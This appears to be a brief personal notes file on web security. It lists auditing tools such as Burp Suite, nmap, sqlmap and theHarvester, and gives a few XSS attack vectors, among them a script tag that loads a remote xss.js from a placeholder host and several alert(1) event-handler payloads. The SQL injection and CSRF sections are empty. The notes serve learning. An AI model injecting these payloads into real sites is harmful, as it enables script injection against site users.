# Notes About Web Security
## Useful Auditing Tools:
`burpsuite` to capture and modify packets (purchase pro version if you like auto scannning :p)

`nmap ncat` to scan and test ports

`whois` and `theharvester` to collect OSINT data

`python` to create scripts

`sqlmap` to detect and exploit SQL Injection

and of course `F12(Developer tools)` in Browser(very useful!)
### #don't be a script kiddy!!


## Common Vulnerbilities

### XSS(Cross Site Scripting)
#### Description
Injects malicious code to a web page
#### Attacking Vectors
##### Basic
`<script src = www.example.com/xss.js></script>`
 
 or
 
 `<script>alert(1)</script>`
##### Advanced Vector
`<a id=x tabindex=1 onactivate=alert(1)></a>`

`<body onafterprint=alert(1)>`



### SQL Injection
### CSRF (Cross-Site-Request-Forgery)
